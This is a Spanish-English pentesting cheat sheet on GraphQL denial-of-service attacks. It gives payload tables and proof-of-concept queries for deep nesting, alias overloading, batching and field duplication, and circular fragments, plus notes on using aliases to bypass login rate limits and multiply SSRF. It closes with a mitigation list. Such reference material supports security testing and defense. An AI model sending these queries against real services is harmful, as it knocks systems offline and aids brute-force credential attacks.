---
aliases:
  - GraphQL DoS
  - Nested Query DoS
  - Aliases Overload
  - Circular Fragments
tags:
  - type/cheatsheet
  - vuln/graphql
  - vuln/dos
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[GraphQL Injection]]'
---
# GraphQL - DoS

***

## Deeply Nested Queries (Recursión)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | GraphQL permite cyclic relations entre types (User→Posts→Author→Posts→...). Sin depth limit, atacante manda query exponencialmente profunda. | Single query → millones de resolves. |
| Single nested probe | `{user{posts{author{posts{author{posts{author{...}}}}}}}}` | 5+ niveles ya costoso. |
| Cyclic relation deep | `{user{friends{friends{friends{friends{friends{name}}}}}}}` | Friend-of-friend abuse. |
| N-cubed problem | Query con 3 niveles donde cada uno retorna 1000 items → 10^9 ops | Resolver que hace DB call por item. |
| Combine con array fields | `{users{posts{comments{replies{user{posts...}}}}}}` | Multiplica fan-out. |
| Pagination abuse | `{users(first:10000){posts(first:10000){comments(first:10000){...}}}}` | Sin limit en pagination. |
| Recursive fragments | Fragment definido recursivo (raro) | Edge case. |
| Self-referencing types | `type User { manager: User! }` recursivo | Common pattern. |
| Mitigation defender | Depth limit (5-7 niveles típicos) + complexity analysis | Standard defense. |
| Bypass depth limit | Inline fragments + aliases | Engine confusion. |
^graphql-dos-nested

### PoC nested DoS

```graphql
query DoS {
  users {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  comments {
                    user {
                      posts {
                        comments {
                          user {
                            id
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

___

## Aliases Overloading

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Aliases permiten llamar mismo field N veces en una query. Sin limit, atacante puede multiplicar carga. | Single query, multiple resolves. |
| Aliased query simple | `{a:user(id:1){name} b:user(id:2){name} ... z:user(id:26){name}}` | 26 calls en 1 query. |
| Massive aliases | 1000 aliases con resolver pesado | DB pool exhaustion. |
| Combine con bruteforce | Aliases + login mutation | Bypass rate limit (ver Auth). |
| Aliases con DB writes | Mutations aliadas | Data corruption. |
| Aliases con SSRF | `{a:fetch(url:"...") b:fetch(url:"...") ...}` | Multi-target SSRF. |
| Stress resolver lent | Resolver que hace API external call → multiplicar | Force API rate limit propio. |
| Apollo limit alias count | Apollo Server v3+ permite limit | Defense. |
| Bypass via fragments | Definir fragments y reutilizar | Edge case. |
| Combine batching + aliases | Multi-request × multi-aliases por request | Compuesto. |
^graphql-dos-aliases

### PoC aliases DoS

```graphql
query Overload {
  a1: expensiveQuery(id: 1) { result }
  a2: expensiveQuery(id: 2) { result }
  a3: expensiveQuery(id: 3) { result }
  # ... 10000 aliases ...
  a10000: expensiveQuery(id: 10000) { result }
}
```

Server ejecuta 10000 resolvers en paralelo → DB connection pool / memory exhausted.

___

## Field Duplication / Batching Abuse

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Field duplication | `{user{id id id id ...}}` con N repeticiones del mismo field | Algunos engines no deduplican. |
| Combine con large response | Field con response gigante × N veces | Memory explosion. |
| Batching abuse | Array de N queries (ver Auth - Batching) | Combine con pesado. |
| Batched introspection | Batch con 1000 introspection queries | Heavy compute. |
| Mutation batched repeated | Same mutation N veces — race conditions + DoS | Combo. |
| Non-existent fields probe spam | Query con 1000 fields nonexistent | Suggestions engine sobrecarga. |
| Massive variables | Query con 10000 variables | Parser overhead. |
| Massive operationName | Long operation names | Parser. |
| Massive fragments | Definir 1000 fragments inused | Memory. |
| Combine con file upload | Multipart con 1000 files via aliased mutations | Disk fill. |
^graphql-dos-batching

___

## Circular Fragments

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Fragments que se referencian entre sí indirectamente | Engine intenta expandir → loop infinito. |
| Fragments mutuos | `fragment A on User {...B} fragment B on User {...A}` | Direct cycle. |
| 3-way cycle | A→B→C→A | Indirecto. |
| GraphQL spec dice rejectar cycles | Engines conformantes lo detectan | Modern OK. |
| Engines viejos vulnerables | Apollo Server v0.x, graphene-django old | Lookup CVE. |
| Combine con introspection | Cyclic introspection trick | Edge case. |
| Bypass via aliases | `{a:user{...A1} b:user{...A2}}` con fragments compuestos | Indirecto. |
| Bypass via inline fragments | `... on User { ... on User { ... } }` | Less common. |
^graphql-dos-circular

### PoC circular fragments

```graphql
query Cycle {
  user {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A
}
```

Engine intenta expandir A → expand B → expand A → loop. Apps modernas detectan y rejectan.

### Mitigación general DoS

- **Depth limit** (max 5-7 niveles).
- **Query complexity analysis** (assign cost por field, max budget).
- **Aliases limit** (max 15 aliases).
- **Batching limit** (max 5 queries por batch).
- **Timeout** (max 5s por query).
- **Rate limit por IP** + por user.
- **Disable introspection** en production.

***
